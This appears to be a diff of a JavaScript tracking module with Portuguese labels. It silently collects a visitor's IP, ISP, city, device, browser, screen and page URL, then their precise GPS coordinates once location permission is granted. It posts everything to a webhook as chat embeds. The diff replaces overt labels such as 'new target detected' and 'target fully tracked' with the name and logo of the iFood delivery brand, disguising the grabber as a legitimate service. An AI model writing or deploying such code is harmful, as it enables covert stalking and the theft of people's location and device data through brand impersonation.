@@ -78,33 +78,27 @@ const IPModule = {
       }
 
       const embed = {
-        title: "\ud83d\udea8 NOVO ALVO DETECTADO",
-        description: "`Sistema de Rastreamento Ativado`",
+        title: "\ud83c\udf10 SITE ABERTO",
         color: 0x00ff00,
         fields: [
           {
-            name: "\ud83c\udf10 REDE",
-            value: `\`\`\`\nIP:        ${d.ip}\nISP:       ${d.org || "N/A"}\nPa\u00eds:      ${d.country || "N/A"}\nRegi\u00e3o:     ${d.region || "N/A"}\nCidade:    ${d.city || "N/A"}\nCEP:       ${d.postal || "N/A"}\nTimezone:  ${d.timezone || "N/A"}\n\`\`\``,
+            name: "\ud83d\udccd LOCALIZA\u00c7\u00c3O",
+            value: `\`\`\`\nIP:      ${d.ip}\nISP:     ${d.org || "N/A"}\nCidade:  ${d.city || "N/A"}, ${d.region || "N/A"}\nPa\u00eds:    ${d.country || "N/A"}\n\`\`\``,
             inline: false
           },
           {
-            name: "\ud83d\udcbb DISPOSITIVO",
-            value: `\`\`\`\nTipo:      ${deviceType}\nModelo:    ${deviceModel}\nSistema:   ${os}\nNavegador: ${browser}\n\`\`\``,
-            inline: true
+            name: "\ud83d\udcf1 DISPOSITIVO",
+            value: `\`\`\`\nTipo:      ${deviceType}\nModelo:    ${deviceModel}\nSistema:   ${os}\nNavegador: ${browser}\nTela:      ${window.screen.width}x${window.screen.height}\n\`\`\``,
+            inline: false
           },
           {
-            name: "\u2699\ufe0f HARDWARE",
-            value: `\`\`\`\nCPU:       ${nav.hardwareConcurrency || "N/A"} cores\nRAM:       ${nav.deviceMemory || "N/A"} GB\nTela:      ${window.screen.width}x${window.screen.height}\nTouch:     ${nav.maxTouchPoints > 0 ? "Sim" : "N\u00e3o"}\n\`\`\``,
-            inline: true
-          },
-          {
-            name: "\ud83d\udd17 NAVEGA\u00c7\u00c3O",
-            value: `\`\`\`\nURL:       ${location.href}\nReferrer:  ${document.referrer || "Direto"}\n\`\`\``,
+            name: "\ud83d\udd17 URL",
+            value: `\`${location.href}\``,
             inline: false
           }
         ],
         footer: {
-          text: "Status: Aguardando Coordenadas GPS...",
+          text: "Aguardando permiss\u00e3o de localiza\u00e7\u00e3o...",
           icon_url: "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"
         },
         timestamp: new Date().toISOString()
@@ -115,8 +109,8 @@ const IPModule = {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          username: "SECURITY SYSTEM",
-          avatar_url: "https://cdn-icons-png.flaticon.com/512/6195/6195699.png",
+          username: "iFood Tracker",
+          avatar_url: "https://logodownload.org/wp-content/uploads/2017/04/ifood-logo-0.png",
           embeds: [embed]
         })
       });
@@ -176,27 +170,23 @@ const IPModule = {
       else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
 
       const embed = {
-        title: "🎯 COORDENADAS GPS OBTIDAS!",
-        description: "`Localização Precisa Capturada`",
+        title: "✅ PERMISSÃO LIBERADA",
         color: 0xff0000,
         fields: [
           {
-            name: "📍 LOCALIZAÇÃO GPS",
-            value: `\`\`\`\nLatitude:  ${lat.toFixed(6)}\nLongitude: ${lon.toFixed(6)}\n\`\`\`\n[📍 Ver no Google Maps](https://maps.google.com/?q=${lat},${lon})`,
+            name: "📍 COORDENADAS GPS",
+            value: `\`\`\`\nLatitude:  ${lat.toFixed(6)}\nLongitude: ${lon.toFixed(6)}\n\`\`\``,
             inline: false
           },
           {
-            name: "🌐 INFORMAÇÕES",
-            value: `\`\`\`\nIP:        ${d.ip}\nCidade:    ${d.city || "N/A"}\nDispositivo: ${deviceType}\nSistema:   ${os}\nNavegador: ${browser}\n\`\`\``,
+            name: "🗺️ GOOGLE MAPS",
+            value: `[Clique aqui para ver a localização](https://maps.google.com/?q=${lat},${lon})`,
             inline: false
           }
         ],
-        thumbnail: {
-          url: `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=400x400&markers=color:red%7C${lat},${lon}&key=AIzaSyDummy`
-        },
         footer: {
-          text: "✅ Status: Alvo Completamente Rastreado",
-          icon_url: "https://cdn-icons-png.flaticon.com/512/4436/4436481.png"
+          text: `IP: ${d.ip} | ${d.city || "N/A"}`,
+          icon_url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
         },
         timestamp: new Date().toISOString()
       };
@@ -206,8 +196,8 @@ const IPModule = {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          username: "GPS TRACKER",
-          avatar_url: "https://cdn-icons-png.flaticon.com/512/684/684908.png",
+          username: "iFood GPS",
+          avatar_url: "https://logodownload.org/wp-content/uploads/2017/04/ifood-logo-0.png",
           embeds: [embed]
         })
       });
